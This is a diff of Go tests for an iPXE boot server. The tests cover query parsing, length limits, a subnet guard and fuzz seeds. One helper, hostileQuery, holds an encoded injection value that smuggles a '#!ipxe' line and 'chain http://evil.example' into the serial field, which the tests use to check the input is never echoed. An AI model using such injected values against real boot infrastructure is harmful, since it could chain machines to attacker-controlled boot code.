@@ -41,18 +41,64 @@ func queryWith(serial, product string) string {
 	return "uuid=" + bootUUID + "&mac=aa-bb-cc-00-00-01&arch=x86_64&serial=" + serial + "&product=" + product
 }
 
-// bootQueries are the queries the tests send, which FuzzParseBootQuery seeds with.
-func bootQueries() []string {
-	return []string{
-		bootQ,
-		queryWith("S2", "P1"),
-		queryWith("S1%0A%23!ipxe%0Achain%20http://evil.example", "%24%7Bevil%7D"),
-		queryWith(strings.Repeat("a", 300), "P1"),
-		queryWith("%00%FF", "P%00"),
-		"uuid=" + zeroUUID + "&mac=aa-bb-cc-00-00-01&arch=arm64&serial=S1&product=P1",
-		"arch=x86_64&serial=S1&product=P1",
-		"",
+// zeroQuery is a boot query whose UUID is the junk all-zero pattern.
+func zeroQuery(serial string) string {
+	return "uuid=" + zeroUUID + "&mac=aa-bb-cc-00-00-01&arch=x86_64&serial=" + serial + "&product=P1"
+}
+
+// hostileQuery is a boot query whose serial and product try to inject script text.
+func hostileQuery() string {
+	return queryWith("S1%0A%23!ipxe%0Achain%20http://evil.example", "%24%7Bevil%7D")
+}
+
+// oversizeQuery is a boot query whose serial is over maxValueBytes.
+func oversizeQuery() string { return queryWith(strings.Repeat("a", 300), "P1") }
+
+// unidentifiedQuery is a boot query with neither a UUID nor a MAC.
+const unidentifiedQuery = "arch=x86_64&serial=S1&product=P1"
+
+// parseCase is one TestParseBootQuery case.
+type parseCase struct {
+	name    string
+	query   string
+	want    Request
+	wantErr error
+}
+
+// parseCases are the TestParseBootQuery cases.
+func parseCases() []parseCase {
+	long := strings.Repeat("a", maxValueBytes+1)
+	return []parseCase{
+		{"normalized", "uuid=4C4C4544-0042-3510-8052-B4C04F4E4D32&mac=AA-BB-CC-00-00-01&arch=arm64&serial=S1&product=P1",
+			Request{UUID: bootUUID, MAC: bootMAC, Serial: "S1", Product: "P1", Arch: fleet.ArchARM64}, nil},
+		{"x86_64 is amd64", bootQ, Request{UUID: bootUUID, MAC: bootMAC, Serial: "S1", Product: "P1", Arch: fleet.ArchAMD64}, nil},
+		{"malformed UUID and MAC", "uuid=nope&mac=nope&arch=x86_64&serial=S&product=P",
+			Request{Serial: "S", Product: "P", Arch: fleet.ArchAMD64}, nil},
+		{"nothing", "", Request{Arch: fleet.ArchAMD64}, nil},
+		{"NUL and invalid UTF-8 dropped", "serial=a%00b%FFc&product=%00",
+			Request{Serial: "abc", Arch: fleet.ArchAMD64}, nil},
+		{"longest allowed", "serial=" + strings.Repeat("a", maxValueBytes),
+			Request{Serial: strings.Repeat("a", maxValueBytes), Arch: fleet.ArchAMD64}, nil},
+		{"long uuid", "uuid=" + long, Request{}, errValueTooLong},
+		{"long mac", "mac=" + long, Request{}, errValueTooLong},
+		{"long serial", "serial=" + long, Request{}, errValueTooLong},
+		{"long product", "product=" + long, Request{}, errValueTooLong},
+		{"long arch", "arch=" + long, Request{}, errValueTooLong},
 	}
+}
+
+// bootQueries are the queries the tests send: every TestParseBootQuery query and
+// every query the handler tests build. FuzzParseBootQuery seeds with them.
+func bootQueries() []string {
+	qs := []string{
+		bootQ, queryWith("S2", "P1"), hostileQuery(), oversizeQuery(),
+		zeroQuery("S1"), zeroQuery("S2"), unidentifiedQuery,
+	}
+	cases := parseCases()
+	for i := range cases {
+		qs = append(qs, cases[i].query)
+	}
+	return qs
 }
 
 func testNow() time.Time { return time.Date(2026, 11, 14, 12, 0, 0, 0, time.UTC) }
@@ -174,6 +220,35 @@ func wantStatus(t *testing.T, rec *httptest.ResponseRecorder, want int) {
 	}
 }
 
+func TestHandlers_GuardedBySubnet(t *testing.T) {
+	g := newRig(t)
+	cases := []struct {
+		name   string
+		h      http.Handler
+		secure bool
+	}{
+		{"PlainHTTP", g.h.PlainHTTP(), false},
+		{"TLS", g.h.TLS(), true},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			req := newRequest(t, "/boot?"+bootQ, tc.secure)
+			req.RemoteAddr = "10.10.30.5:1"
+			rec := httptest.NewRecorder()
+
+			tc.h.ServeHTTP(rec, req)
+
+			wantStatus(t, rec, http.StatusForbidden)
+			if rec.Body.Len() != 0 {
+				t.Errorf("body = %q, want empty", rec.Body.String())
+			}
+			if n := g.count("SELECT count(*) FROM machines"); n != 0 {
+				t.Errorf("machines = %d, want 0", n)
+			}
+		})
+	}
+}
+
 func TestStart_StaticScript(t *testing.T) {
 	g := newRig(t)
 
@@ -208,7 +283,7 @@ func TestBootPlain_ChainsToTLS(t *testing.T) {
 func TestBootPlain_OversizeStillChains(t *testing.T) {
 	g := newRig(t)
 
-	rec := g.plain("/boot?" + queryWith(strings.Repeat("a", 300), "P1"))
+	rec := g.plain("/boot?" + oversizeQuery())
 
 	wantStatus(t, rec, http.StatusOK)
 	if got, want := rec.Body.String(), StartScript(testFQDN); got != want {
@@ -259,7 +334,7 @@ func TestBoot_UnknownHoldReportsAndHolds(t *testing.T) {
 
 func TestBoot_RequestTextNeverEchoed(t *testing.T) {
 	g := newRig(t)
-	q := queryWith("S1%0A%23!ipxe%0Achain%20http://evil.example", "%24%7Bevil%7D")
+	q := hostileQuery()
 
 	for _, pass := range []string{"first contact", "known machine"} {
 		body := g.boot(q)
@@ -288,14 +363,11 @@ func TestBoot_IdentityConflictHolds(t *testing.T) {
 
 func TestBoot_JunkPatternUUIDConflictViaMAC(t *testing.T) {
 	g := newRig(t)
-	zero := func(serial string) string {
-		return "uuid=" + zeroUUID + "&mac=aa-bb-cc-00-00-01&arch=x86_64&serial=" + serial + "&product=P1"
-	}
-	g.boot(zero("S1"))
+	g.boot(zeroQuery("S1"))
 
 	// The machine is found by the MAC it owns. Its junk-pattern UUID is junk from the first
 	// boot, so as in fleet.Observe the conflict holds without a second mark or an alert.
-	if body := g.boot(zero("S2")); !strings.Contains(body, holdingConflict) {
+	if body := g.boot(zeroQuery("S2")); !strings.Contains(body, holdingConflict) {
 		t.Errorf("body = %q, want it to contain %q", body, holdingConflict)
 	}
 	if n := g.count("SELECT count(*) FROM machines"); n != 1 {
@@ -345,7 +417,7 @@ func TestBoot_InstallingBecomesUnconfirmed(t *testing.T) {
 func TestBoot_OversizeParamRejected(t *testing.T) {
 	g := newRig(t)
 
-	rec := g.secure("/boot?" + queryWith(strings.Repeat("a", 300), "P1"))
+	rec := g.secure("/boot?" + oversizeQuery())
 
 	wantStatus(t, rec, http.StatusBadRequest)
 	if rec.Body.Len() != 0 {
@@ -359,7 +431,7 @@ func TestBoot_OversizeParamRejected(t *testing.T) {
 func TestBoot_UnidentifiableStillServesScript(t *testing.T) {
 	g := newRig(t)
 
-	rec, line := g.wide("/boot?arch=x86_64&serial=S1&product=P1")
+	rec, line := g.wide("/boot?" + unidentifiedQuery)
 
 	wantStatus(t, rec, http.StatusOK)
 	if !strings.HasPrefix(rec.Body.String(), "#!ipxe\nparams\n") {
@@ -521,30 +593,7 @@ func TestM1Fallback(t *testing.T) {
 }
 
 func TestParseBootQuery(t *testing.T) {
-	long := strings.Repeat("a", maxValueBytes+1)
-	cases := []struct {
-		name    string
-		query   string
-		want    Request
-		wantErr error
-	}{
-		{"normalized", "uuid=4C4C4544-0042-3510-8052-B4C04F4E4D32&mac=AA-BB-CC-00-00-01&arch=arm64&serial=S1&product=P1",
-			Request{UUID: bootUUID, MAC: bootMAC, Serial: "S1", Product: "P1", Arch: fleet.ArchARM64}, nil},
-		{"x86_64 is amd64", bootQ, Request{UUID: bootUUID, MAC: bootMAC, Serial: "S1", Product: "P1", Arch: fleet.ArchAMD64}, nil},
-		{"malformed UUID and MAC", "uuid=nope&mac=nope&arch=x86_64&serial=S&product=P",
-			Request{Serial: "S", Product: "P", Arch: fleet.ArchAMD64}, nil},
-		{"nothing", "", Request{Arch: fleet.ArchAMD64}, nil},
-		{"NUL and invalid UTF-8 dropped", "serial=a%00b%FFc&product=%00",
-			Request{Serial: "abc", Arch: fleet.ArchAMD64}, nil},
-		{"longest allowed", "serial=" + strings.Repeat("a", maxValueBytes),
-			Request{Serial: strings.Repeat("a", maxValueBytes), Arch: fleet.ArchAMD64}, nil},
-		{"long uuid", "uuid=" + long, Request{}, errValueTooLong},
-		{"long mac", "mac=" + long, Request{}, errValueTooLong},
-		{"long serial", "serial=" + long, Request{}, errValueTooLong},
-		{"long product", "product=" + long, Request{}, errValueTooLong},
-		{"long arch", "arch=" + long, Request{}, errValueTooLong},
-	}
-	for _, tc := range cases {
+	for _, tc := range parseCases() {
 		t.Run(tc.name, func(t *testing.T) {
 			q, err := url.ParseQuery(tc.query)
 			if err != nil {
